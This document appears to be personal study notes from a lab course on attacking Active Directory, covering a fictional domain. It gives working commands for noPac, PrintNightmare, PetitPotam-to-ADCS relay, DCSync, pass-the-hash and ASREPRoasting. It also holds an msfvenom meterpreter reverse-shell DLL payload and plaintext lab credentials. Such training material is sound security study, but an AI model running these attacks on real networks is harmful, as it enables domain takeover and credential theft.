# Active Directory Enumeration and Attacks

## ACTIVE DIRECTORY Enum & Attacks

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg)

AD method

#### **In Scope For Assessment**

| Range/Domain                  | Description                                                                               |
| ----------------------------- | ----------------------------------------------------------------------------------------- |
| INLANEFREIGHT.LOCAL           | Customer domain to include AD and web services.                                           |
| LOGISTICS.INLANEFREIGHT.LOCAL | Customer subdomain                                                                        |
| FREIGHTLOGISTICS.LOCAL        | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
| 172.16.5.0/23                 | In-scope internal subnet.                                                                 |

## **Tools of the Trade**

| Tool                                                                                                                | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1/https://github.com/dmchell/SharpView | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net\* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| https://github.com/BloodHoundAD/BloodHound                                                                          | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a https://neo4j.com/ database for graphical analysis of the AD environment.                                                                                                                                                                                                                   |
| https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors                                                   | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                      |
| https://github.com/fox-it/BloodHound.py                                                                             | A Python-based BloodHound ingestor based on the https://github.com/CoreSecurity/impacket/. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.                                                                                                                                                                                                                                                                                                                                         |
| https://github.com/ropnop/kerbrute                                                                                  | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| https://github.com/SecureAuthCorp/impacket                                                                          | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.                                                                                                                                                                                                                                                                                                                                                                                                                             |
| https://github.com/lgandx/Responder                                                                                 | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1                                                  | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh                                                      | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo                            | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.                                                                                                                                                            |
| https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html                                                  | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| https://github.com/byt3bl33d3r/CrackMapExec                                                                         | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.                                                                                                                                                                                                                                                                                                                                 |
| https://github.com/GhostPack/Rubeus                                                                                 | Rubeus is a C# tool built for Kerberos Abuse.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py                                      | Another Impacket module geared towards finding Service Principal names tied to normal users.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| https://hashcat.net/hashcat/                                                                                        | A great hash cracking and password recovery tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| https://github.com/CiscoCXSecurity/enum4linux                                                                       | A tool for enumerating information from Windows and Samba systems.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://github.com/cddmp/enum4linux-ng                                                                              | A rework of the original Enum4linux tool that works a bit differently.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| https://linux.die.net/man/1/ldapsearch                                                                              | Built-in interface for interacting with the LDAP protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| https://github.com/ropnop/windapsearch                                                                              | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| https://github.com/dafthack/DomainPasswordSpray                                                                     | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| https://github.com/leoloobeek/LAPSToolkit                                                                           | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).                                                                                                                                                                                                                                                                                                                                                                                             |
| https://github.com/ShawnDEvans/smbmap                                                                               | SMB share enumeration across a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py                                           | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py                                          | Part of the Impacket toolkit, it provides the capability of command execution over WMI.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| https://github.com/SnaffCon/Snaffler                                                                                | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py                                        | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11) | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| https://github.com/ParrotSec/mimikatz                                                                               | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py                                      | Remotely dump SAM and LSA secrets from a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| https://github.com/Hackplayers/evil-winrm                                                                           | Provides us with an interactive shell on a host over the WinRM protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py                                      | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| https://github.com/Ridter/noPac                                                                                     | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py                                          | Part of the Impacket toolset, RPC endpoint mapper.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py                                                 | Printnightmare PoC in python.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py                                       | Part of the Impacket toolset, it performs SMB relay attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| https://github.com/topotam/PetitPotam                                                                               | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py                                                 | Tool for manipulating certificates and TGTs.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py                                                    | This tool will use an existing TGT to request a PAC for the current user using U2U.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| https://github.com/dirkjanm/adidnsdump                                                                              | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| https://github.com/t0thkr1s/gpp-decrypt                                                                             | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py                                       | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.                                                                                                                                                                                                                                                                                                                            |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py                                        | SID bruteforcing tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py                                         | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py                                       | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer                                                  | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.                                                                                                                                                  |
| https://www.pingcastle.com/documentation/                                                                           | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on https://en.wikipedia.org/wiki/Capability\_Maturity\_Model\_Integration adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                                   |
| https://github.com/Group3r/Group3r                                                                                  | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| https://github.com/adrecon/ADRecon                                                                                  | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.                                                                                                                                                                                                                                                                                                                                                             |





## **Stacking The Deck**

## **Privileged Access**

#### **Enumerating the Remote Desktop Users Group**

* `PS C:\htb> Import-Module .\PowerView.ps1`
* `PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`

In bloodhound, for a specific user (whose foothold we have) check for what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

![Untitled](<../.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 10.png>)

We can see wley is member of domain user and can rdp into academy…

### **WinRM**

Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts.

We can use this cypher query in bloodhound to hunt for users with Remote Management access

* `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2`

![Untitled](<../.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 11.png>)

We can establish Winrm session from windows as

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred[ACADEMY-EA-DB01]: 

PS C:\Users\forend\Documents> hostname
ACADEMY-EA-DB01
[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb>
```

Alternatively we can use Evil-WinRM from linux as

* `dollarboysushil@htb[/htb]**$** evil-winrm -i 10.129.201.234 -u forend`

## **SQL Server Admin**

Cypher query to hunt for users with SQLAdmin rights

* `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`

![Untitled](<../.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 12.png>)

#### **Enumerating MSSQL Instances with PowerUpSQL**

```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

```powershell
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

From linux using `mssqlclient.py`

* `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`

then we can run os command using

* `SQL> enable_xp_cmdshell`
* `SQL>` `xp_cmdshell whoami /priv`

## **Kerberos "Double Hop" Problem**

![Untitled](<../.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 13.png>)

The Kerberos "double hop" problem arises in scenarios where authentication is required across multiple servers or services. For example, when a user logs into Server A and then Server A needs to access Server B on behalf of the user, traditional Kerberos authentication fails because the user's credentials cannot be passed from Server A to Server B. This problem is typically encountered in web applications, remote desktop services, and distributed computing environments.

## **Workaround #1: PSCredential Object**

* `*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1`
* `get-domainuser -spn` this will give us error because we cannot pass our authentication on to the Domain Controller to query for the SPN account

If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL

    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

So now, let's set up a PSCredential object and try again. First, we set up our authentication.

* `*Evil-WinRM* PS C:\Users\backupadm\Documents>$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force`
* `Evil-WinRM* PS C:\Users\backupadm\Documents> **$**Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)`

Now when we try to query for the SPN account while passing our credential along, our cmd will be successfull

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
```

if we again try without `-credential` flag then, we will get the same error.

IF we RDP to the same host, open CMD and type `klist` we will see necessary tickets cached directly with the DC, and no problem of double hop problem.

```
C:\htb> klist

Current LogonId is 0:0x1e5b8b

Cached Tickets: (4)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#1>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#2>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#3>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

## **Workaround #2: Register PSSession Configuration**

Let's start by first establishing a WinRM session on the remote host.

* `PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm`

now when we run `klist` we will get the same error

```powershell
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x11e387

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40a10000 -
```

One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.

```powershell
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

 WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
 a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
 required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.

   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin
```

Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.

```powershell
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x2239ba

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       Start Time: 6/28/2022 13:24:37 (local)
       End Time:   6/28/2022 23:24:37 (local)
       Renew Time: 7/5/2022 13:24:37 (local)
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x1 -> PRIMARY
       Kdc Called: DC01
```

## **Bleeding Edge Vulnerabilities**

## **NoPac (SamAccountName Spoofing)**

CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287),&#x20;

**By default, every authenticated user can add up to ten computers to the Domain. The following steps explain how to perform this attack.**

* Create a new account in Active Directory with a random name and then rename it to one of the Domain Controllers without the trailing “$” symbol.
* Request a Kerberos ticket for the created account. Once the ticket is granted, change the name of the account created back to its original name (i.e., the random name chosen in the first step).
* Use the ticket to request an access token from the TGS for a specific service. Because of the absence of an account with that name, the TGS chooses the closest match and appends a “$” symbol. In this way, access to the service is granted with Domain Controller privileges.

another explaination

authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.&#x20;

Exploit

* Make sure we have impacket installed in our attacking linux
* then install Nopac exploit repo [https://github.com/Ridter/noPac](https://github.com/Ridter/noPac)
* `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` → checking if target is vulnerable
* `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` → executing the exploit to get shell.

#### **Using noPac to DCSync the Built-in Administrator Account**

* `dollarboysushil@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`

## **PrintNightmare**

[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) found in the print spooler service.

Exploit to use: `https://github.com/cube0x0/CVE-2021-1675.git` developed by `cube0x0`

For this exploit to run, we need to use cube0x0’s version of impacket which can be achieved as;

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

* `dollarboysushil@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'` → enumerating for ms-rprn
* `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll` → crafting dll payload
* `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` → creating SMB share using smbserver.py
* then start msf multi/handler
  * use explit/multi/handler set payload windows/x64/meterpreter/reverse\_tcp set lhost, set lport and run
* `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'` → running the shell.

## **PetitPotam (MS-EFSRPC)**

[CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) allows unauthenticated attacker to coerce a DC to authenticate against another host using NTLM over the port 445

*   `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`

    starting ntlmrelay
*   `dollarboysushil@htb[/htb]**$** python3 PetitPotam.py 172.16.5.225 172.16.5.5`

    running [petitpotam.py](http://petitpotam.py) with attackerhost IP and DC ip to force DC to authenticate to our host when nrlmrelayx is running.

In our ntlmrelay running tab, we will see successfull login request and base64 encoded certificate for the domain controller.

Using the base64 certificate, we can use [gettgtpkinit.py](http://gettgtpkinit.py) tool to request TGT for the domain controller.

*   `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache`

    The TGT will be saved to dc01.ccache file. lets set the KRBCCNAME env variable to that ccache
* `dollarboysushil@htb[/htb]**$** export KRB5CCNAME=dc01.ccache`

Using DC TGT lets do DCSync

*   `dollarboysushil@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`

    this will give us the NTLM hash

#### **Confirming Admin Access to the Domain Controller**

* `dollarboysushil@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf`

## **Miscellaneous Misconfigurations**

## **Enumerating DNS Records**

We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account.

*   `dollarboysushil@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`

    we can use `-r` flag to resolve unknown records

    data will be saved in `records.csv`

## **ASREPRoasting**

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled.

First , search for account with Donot\_req\_preauth

* `PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl`
* `PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` or using kerbrute
* `dollarboysushil@htb[/htb]**$** kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`

| Command                                                           | Description                                                                                                                                          |
| ----------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| Import-Module .\SecurityAssessment.ps1                            | Used to import the module Security Assessment.ps1. Performed from a Windows-based host.                                                              |
| Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL | SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.                    |
| adidnsdump -u inlanefreight\forend ldap://172.16.5.5              | Used to resolve all records in a DNS zone over LDAP from a Linux-based host.                                                                         |
| adidnsdump -u inlanefreight\forend ldap://172.16.5.5 -r           | Used to resolve unknown records in a DNS zone by performing an A query (-r) from a Linux-based host.                                                 |
| Get-DomainUser \*                                                 | Select-Object samaccountname,description                                                                                                             |
| Get-DomainUser -UACFilter PASSWD\_NOTREQD                         | Select-Object samaccountname,useraccountcontrol                                                                                                      |
| ls \academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts            | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

## Why So Trusting? (Golden Ticket)

## Domain Trusts Primer

A [trust](https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.&#x20;

![Untitled](<../.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 14.png>)

![Untitled](<../.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 15.png>)

## **Enumerating Trust Relationships**

```powershell
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
